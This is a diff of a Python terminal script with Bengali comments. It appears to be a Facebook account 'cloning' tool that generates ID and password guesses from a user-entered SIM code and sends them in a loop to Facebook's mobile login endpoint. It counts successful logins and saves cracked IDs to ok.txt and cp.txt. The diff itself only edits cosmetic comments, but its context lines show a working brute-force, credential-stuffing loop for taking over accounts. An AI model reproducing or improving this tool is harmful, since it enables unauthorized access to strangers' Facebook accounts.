@@ -11,7 +11,7 @@ O = '\033[1;38;5;208m' # Orange
 
 def banner():
     os.system('clear')
-    # META লোগোটি একদম মাঝখানে সেট করা হয়েছে
+    # META লোগোটি একদম মাঝখানে রাখার জন্য ১৬টি স্পেস ব্যবহার করা হয়েছে
     print(f"""
 {R}                ███    ███  ███████  ████████  █████  
 {G}                ████  ████  ██          ██    ██   ██ 
@@ -54,6 +54,7 @@ def cloning_start():
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     code = input(f'{G}[+] ENTER SIM CODE: {W}')
     
+    # এখানে সংখ্যাগুলোতে আলাদা আলাদা কালার দেওয়া হয়েছে
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{R}[•] {G}EXAMPLE : [ {Y}10000{G}, {O}20000{G}, {G}50000 {G}]{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
@@ -83,7 +84,7 @@ def cloning_start():
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        # মিটারটি মাঝখানে রাখার জন্য সঠিক স্পেস দেওয়া হয়েছে
+        # মিটার পজিশন ঠিক করা হয়েছে
         sys.stdout.write(f'\r{G}      [MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
 
         try:
@@ -107,6 +108,7 @@ def cloning_start():
     print(f'{G}[+] CRACK PROCESS COMPLETED')
     print(f'[+] IDS SAVED IN ok.txt,cp.txt')
     print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
+    # BACK বাটন সেন্টারে আনা হয়েছে
     input(f'\n           {G} [ BACK ]{W}')
     main()
 
